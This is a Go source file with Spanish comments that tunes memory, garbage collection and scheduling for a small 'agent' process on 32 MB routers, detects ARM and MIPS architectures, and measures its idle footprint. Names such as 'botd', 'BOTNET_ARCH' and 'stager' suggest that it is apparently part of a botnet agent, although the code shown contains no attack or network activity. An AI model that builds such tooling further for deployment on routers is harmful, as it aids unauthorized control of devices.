package agent

import (
	"fmt"
	"os"
	"runtime"
	"runtime/debug"
)

// Presupuesto del runtime del agente (BLUEPRINT §4): un solo proceso en
// routers de 32 MB; los valores van exportados al entorno para que el
// reexec del watchdog (EP-05) los herede sin recompilar.
const (
	MemLimitBytes = 5 << 20 // GOMEMLIMIT=5MiB; la auto-matanza es el último recurso
	GCPercent     = 40      // GOGC=40: GC frecuente y corto en MIPS
	MaxProcs      = 1       // GOMAXPROCS=1: un P, sin planificador paralelo
)

type EnvSnapshot struct {
	MemLimitBytes int64
	GCPercent     int
	MaxProcs      int
}

// ApplyRuntimeBudget fija límite de heap, GC y scheduler, exporta las
// tres claves al entorno y devuelve el estado efectivo.
func ApplyRuntimeBudget() EnvSnapshot {
	debug.SetMemoryLimit(MemLimitBytes)
	debug.SetGCPercent(GCPercent)
	runtime.GOMAXPROCS(MaxProcs)
	os.Setenv("GOMEMLIMIT", memLimitEnv())
	os.Setenv("GOGC", fmt.Sprint(GCPercent))
	os.Setenv("GOMAXPROCS", fmt.Sprint(MaxProcs))
	return EnvSnapshot{MemLimitBytes: MemLimitBytes, GCPercent: GCPercent, MaxProcs: MaxProcs}
}

func memLimitEnv() string {
	if MemLimitBytes%(1<<20) == 0 {
		return fmt.Sprintf("%dMiB", MemLimitBytes>>20)
	}
	return fmt.Sprint(MemLimitBytes)
}

// Lines son las tres claves visibles por `botd --print-env` (T-0301 AC2).
func (e EnvSnapshot) Lines() []string {
	return []string{
		fmt.Sprintf("GOMEMLIMIT=%dMiB", e.MemLimitBytes>>20),
		fmt.Sprintf("GOGC=%d", e.GCPercent),
		fmt.Sprintf("GOMAXPROCS=%d", e.MaxProcs),
	}
}

// ArchFromRuntime mapea runtime.GOARCH al tag de la matriz (nodes.arch).
// El stager pisa BOTNET_ARCH cuando corre bajo QEMU con otro target; en
// arm, GOARM del build distingue v5 de v7.
func ArchFromRuntime() string {
	if v := os.Getenv("BOTNET_ARCH"); v != "" {
		return v
	}
	switch runtime.GOARCH {
	case "arm":
		if os.Getenv("GOARM") == "5" {
			return "armv5"
		}
		return "armv7"
	case "mips":
		return "mipsbe"
	case "mipsle":
		return "mipsle"
	default:
		return runtime.GOARCH // amd64, arm64
	}
}

// IdleFootprint es el doble de `ps -o rss=` y del diff de
// runtime.NumGoroutine que exige T-0301 AC3 en QEMU: el tope de 3,1 MB
// de RSS solo se puede medir en hardware, así que aquí se presupuesta
// heap+stack en uso y la estabilidad de gorutinas en reposo.
func IdleFootprint() (goroutines int, heapKiB uint64) {
	var ms runtime.MemStats
	runtime.ReadMemStats(&ms)
	return runtime.NumGoroutine(), (ms.HeapInuse + ms.StackInuse) / 1024
}
